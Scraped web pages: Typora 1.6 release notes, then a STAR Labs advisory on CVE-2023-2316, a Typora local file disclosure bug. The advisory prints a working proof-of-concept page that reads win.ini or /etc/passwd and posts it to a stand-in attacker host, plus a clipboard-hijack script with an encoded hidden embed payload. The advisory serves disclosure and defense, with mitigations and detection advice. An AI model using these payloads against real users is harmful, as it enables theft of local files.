=== Content from support.typora.io_18185acf_20250111_130857.html ===


* [Back](/)
# Typora 1.6

May 22, 2023
by
typora.io

> From this version, Windows 7, 8, 8.1 are no longer supported. For older Windows support, [please check here](/Older-Windows-Support/).

## “Files” Section in Preferences Panel

In this version, we rearranged groups in Preferences Panel, and added a new group “Files” in Preferences Panel for files related configs.

![CleanShot 2023-05-10 at 21.45.48@2x](/media/new-1.6/new-preferences.png)

Some new options are added:

1. Typora now allow user to set default file extensions when save file or add new file in files sidebar.
2. Typora now allow user to config actions when drop file or folders into Typora, currently it provides following two options:
   * Open or import the file / folder in Typora
   * Insert a file link into Typora

## Options to Disable Auto Links

You can now config whether Typora should auto recognize and render links from `Preferences Panel` → `Markdown` → `Syntax Support`.

* When **Auto Links is disabled**, links like `https://typora.io` or `mailto:[[email protected]](/cdn-cgi/l/email-protection)` in the markdown document will NOT rendered as <ttps://typora.io> or [[email protected]](/cdn-cgi/l/email-protection#9aefe9ffe8daffe2fbf7eaf6ffb4f9f5f7).

  But you can use syntax like `[title](url)` or `<url>` to insert links.
* When **Auto Links is enabled**, links like `https://typora.io` or `mailto:[[email protected]](/cdn-cgi/l/email-protection)` in the markdown document will rendered as <ttps://typora.io> or [[email protected]](/cdn-cgi/l/email-protection#136660766153766b727e637f763d707c7e) automatically.

## Default Code Language

You can now set default code language for code blocks from `Preferences Panel` → `Code Fences`.

![Screenshot 2023-05-25 at 10.51.51](/media/code/default-lang.png)

And Typora provides some apply options:

* Apply default code language when add code fences from menubar, context menu, or from shortcut keys.
* Apply default code language when add code fences by input markdown syntax `````. You can press **Backspace** key or **Undo** to delete auto applied code language.
* Apply in both cases.

| Auto Apply Code Language for Code Blocks inserted from menu | Auto Apply Code Language for Code Blocks inserted from Markdown |
| --- | --- |
|  |  |

You can also choose **Last Used** to auto apply last used code language when insert new code blocks.

## Timeline Diagram

Typora now upgrade mermaid library to version 10, and [timeline diagram](https://mermaid.js.org/syntax/timeline.html) is now supported.

![Screenshot 2023-05-10 at 22.46.25](/media/new-1.6/Screenshot 2023-05-10 at 22.46.25.png)

We also added a link for diagram configurations in `Preferences Panel` → `Markdown` → `Syntax Support` → `Diagrams`.

## Other Changes

### Thai Language Support

Typora now speaks Thai, thanks to [ARMnunf](https://github.com/ARMnunf)!

![Screenshot 2023-05-10 at 22.57.05](/media/new-1.6/Screenshot 2023-05-10 at 22.57.05.png)

### PicList as an Image Uploader

![PicList ](/media/new-1.6/piclist.png)

Typora now added PicList as an image uploader service. See [here for more details](/Upload-Image/#piclist-chinese-language-only).

### Other Improvements

* Add `PEG.js` syntax highlight support.

### Privacy & Security Updates

* Fix CVE-2023-2317
* Fix CVE-2023-2316
* Avoid using google font mirrors in exported HTML, now official google font CDN is used.

### Bug Fix

* Fix using `keyword["keyword"]` sometimes causes node not rendered in Mermaid diagram.
* Fix color of typic package not readable in dark themes.
* Fix setting inline mermaid configs may also affect other mermaid blocks.
* Fix tasks status cannot be changed from menu bar when task list is under nested lists.
* Fix math block is always auto numbered in exported docx and related setting is ignored.
* [Spec change] Typora now allow users to escape `:` mark to avoid input unwanted emoji codes.

### Notice for Windows

From this version, Windows 7, 8, 8.1 are no longer supported.

For older Windows support, [please check here](/Older-Windows-Support/).

[Get Typora](https://store.typora.io) /
[Help Improve our documents](https://github.com/typora/wiki-website)



=== Content from starlabs.sg_c8358b5c_20250111_130856.html ===

[![logo](https://starlabs.sg/logo-white.png)](https://starlabs.sg/ "  (Alt + H)")

* [Home](https://starlabs.sg/ "Home")
* [About](https://starlabs.sg/about/ "About")
* [Advisories](https://starlabs.sg/advisories/ "Advisories")
* [Blog](https://starlabs.sg/blog/ "Blog")
* [Achievements](https://starlabs.sg/achievements/ "Achievements")
* [Publications](https://starlabs.sg/publications/ "Publications")
* [Search](https://starlabs.sg/search/ "Search (Alt + /)")

[Home](https://starlabs.sg/) » [Advisories](https://starlabs.sg/advisories/)
# (CVE-2023-2316) Typora Local File Disclosure

August 19, 2023 · 5 min · Li Jiantao (@CurseRed)

Table of Contents

* [Summary:](#summary)
* [CVSS3.1 Scoring System:](#cvss31-scoring-system)
* [Product Overview:](#product-overview)
* [Vulnerability Summary:](#vulnerability-summary)
* [Vulnerability Details:](#vulnerability-details)
* [Exploit Conditions:](#exploit-conditions)
* [Proof-of-Concept:](#proof-of-concept)
* [Attack Scenario:](#attack-scenario)
  + [Scenario 1: Open a malicious markdown file](#scenario-1-open-a-malicious-markdown-file)
  + [Scenario 2: Copy and paste from a webpage](#scenario-2-copy-and-paste-from-a-webpage)
  + [Additional Notes:](#additional-notes)
* [Suggested Mitigations:](#suggested-mitigations)
* [Detection Guidance:](#detection-guidance)
* [Credits:](#credits)
* [Timeline:](#timeline)

## Summary:[#](#summary)

| **Product** | Typora |
| --- | --- |
| **Vendor** | Typora |
| **Severity** | Medium |
| **Affected Versions** | Typora for Windows/Linux < 1.6.7 |
| **Tested Versions** | Typora for Windows 1.5.12, Typora for Linux 1.5.10 |
| **CVE Identifier** | CVE-2023-2316 |
| **CVE Description** | Improper path handling in Typora before 1.6.7 on Windows and Linux allows a crafted webpage to access local files and exfiltrate them to remote web servers via “typora://app/<absolute-path>”. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora. |
| **CWE Classification(s)** | CWE-22 Improper Limitation of a Pathname to a Restricted Directory (‘Path Traversal’) |
| **CAPEC Classification(s)** | CAPEC-597 Absolute Path Traversal |

## CVSS3.1 Scoring System:[#](#cvss31-scoring-system)

**Base Score:** 6.3 (Medium)

**Vector String:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N`

| **Metric** | **Value** |
| --- | --- |
| **Attack Vector (AV)** | Local |
| **Attack Complexity (AC)** | Low |
| **Privileges Required (PR)** | None |
| **User Interaction (UI)** | Required |
| **Scope (S)** | Changed |
| **Confidentiality (C)** | High |
| **Integrity (I)** | None |
| **Availability (A)** | None |

## Product Overview:[#](#product-overview)

Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.

Typora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to access arbitrary local files from a malicious webpage loaded in the markdown editor.

## Vulnerability Summary:[#](#vulnerability-summary)

There is a Local File Disclosure vulnerability in `typora://app/` in Typora for Windows/Linux, allowing a crafted webpage to access local files and exfiltrate them to remote web servers. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.

## Vulnerability Details:[#](#vulnerability-details)

In `resources/app.asar/atom.js`, a custom URL scheme `typora://` is registered via `electron.protocol.registerFileProtocol` API. This URL scheme is designed for loading local resources for the editor itself. Here is the code snippet handling `typora://` :

```
l.registerFileProtocol(e, function(e, t) {
    e.url ? t({
        path: c.getRealPath(e.url)
    }) : t({
        error: -324
    })
})
c.getRealPath = function(e) {
    try {
        e = decodeURI(e)
    } catch (e) {}
    e = e.substr(13);
    return /^userData/.exec(e) && (e = e.replace(/^userData/, c.getPath("userData").replace(/\\/g, "\\\\"))),
    /current-theme\.css$/.exec(e) && (e = e.replace(/current-theme\.css$/, c.setting.curTheme())),
    /^typemark/i.exec(e) && (e = e.replace(/^typemark/, t)),
    e = (e = /preview\.html/.exec(e) ? e.replace(/\.html[?#].*$/, ".html") : e).replace(/[?#][^\\\/]*$/, "")
}

```

This file protocol handler passes the URL to `getRealPath` function for some match and replacement. For example, when the main window tries to load `typora://app/typemark/window.html`, the URL will be converted and loaded from `[Typora Installation Absolute Path]/resources/window.html`.

However, it is discovered that an external webpage loaded in `<embed>` tag is able to read arbitrary local files by executing the following JavaScript code:

```
fetch('typora://app/C:/windows/win.ini').then(r=>r.text()).then(r=>{console.log(r)})

```

![](/advisories/23/images/CVE-2023-2316_01.Typora-for-WIndows-1-5-12-Local-File-Disclosure.png)

![](/advisories/23/images/CVE-2023-2316_02.Typora-for-Linux-1-5-10-Local-File-Disclosure-Tested-on-Ubuntu.png)

## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:

```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Typora 1.5.12 Local File Disclosure Proof-of-Concept</title>
</head>
<body>
    <pre id="log" style="background: #eee; width: 100%;"></pre>
    <script>
        const log = t => {
            document.getElementById("log").textContent += t + '\r\n';
            fetch('//example.localtest.me/send-file-to-attacker-server', {mode: 'no-cors', body: t, method: 'POST'})
        }
        log('location.origin: ' + location.origin)
        log('navigator.platform: ' + navigator.platform)
        log(' ')
        if(navigator.platform === 'Win32'){
            log('Content of your C:\\Windows\\win.ini:')
            fetch('typora://app/C:/windows/win.ini').then(r=>r.text()).then(r=>{log(r)})
        } else {
            log('Content of your /etc/passwd:')
            fetch('typora://app/etc/passwd').then(r=>r.text()).then(r=>{log(r)})
        }
    </script>
</body>
</html>

```

Save the above HTML file as `poc1.html` and serve it on a webserver, then append this line to any markdown file in Typora: `<embed src="http(s)://YOUR-WEB-SERVER/poc1.html">`. Once the PoC is loaded in the `<embed>` tag, it will:

1. Try to read `C:/Windows/win.ini` on Windows, or `/etc/passwd` on Linux,
2. Show the content of the file in the webpage,
3. Send the file to external URL on `example.localtest.me` (this domain resolves to 127.0.0.1 for demonstration purposes only).

## Attack Scenario:[#](#attack-scenario)

### Scenario 1: Open a malicious markdown file[#](#scenario-1-open-a-malicious-markdown-file)

An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.

We have attached `poc/typora-1.5.12-local-file-disclosure.md` with this report for demonstration. It loads poc1.html from `https://o.cal1.cn/f0a97fdef8028595-typora-poc/local-file-disclosure.html`. Open the file in affected version of Typora to verify this vulnerability.

### Scenario 2: Copy and paste from a webpage[#](#scenario-2-copy-and-paste-from-a-webpage)

An attacker can craft a malicious webpage and hook on the `copy` event with the following code:

```
<script>
    document.addEventListener('copy',e=>{
        e.preventDefault();
        let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJodHRwczovL28uY2FsMS5jbi9mMGE5N2ZkZWY4MDI4NTk1LXR5cG9yYS1wb2MvbG9jYWwtZmlsZS1kaXNjbG9zdXJlLmh0bWwiPiYjeDBkOyYjeDBkOw==');
        e.clipboardData.setData('text/markhtml', `\x20\x0d\x0a\x0d\x0a` + payload + window.getSelection());
        console.log(payload + window.getSelection())
    })
</script>

```

When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.

![](/advisories/23/images/CVE-2023-2316_03.Copy-and-Paste.gif)

*Note: A live version of copy-and-paste PoC can be found [here](https://o.cal1.cn/f0a97fdef8028595-typora-poc/local-file-disclosure-cp.html).*

### Additional Notes:[#](#additional-notes)

1. It is possible for attackers to set custom styles on the `<embed>` tag to make the exploit less noticeable. For instance, `height:0;` is used in the Scenario 2 PoC to hide the embedded webpage.

## Suggested Mitigations:[#](#suggested-mitigations)

Prohibit http(s) webpages from accessing `typora://` resources.

For end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the presence of `embed` tags loading suspicious URLs in markdown files.

## Credits:[#](#credits)

Li Jiantao ([@CurseRed](https://twitter.com/CurseRed)) of STAR Labs SG Pte. Ltd. ([@starlabs\_sg](https://twitter.com/starlabs_sg))

## Timeline:[#](#timeline)

* 2023-04-27 Vendor Disclosure
* 2023-05-22 Vendor Patch Release
* 2023-08-19 Public Release

[« Prev

(CVE-2023-2110) Obsidian Local File Disclosure](https://starlabs.sg/advisories/23/23-2110/)
[Next »

(CVE-2023-2317) Typora DOM-Based Cross-site Scripting leading to Remote Code Execution](https://starlabs.sg/advisories/23/23-2317/)

© 2024 [STAR Labs](https://starlabs.sg/)
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://git.io/hugopapermod)


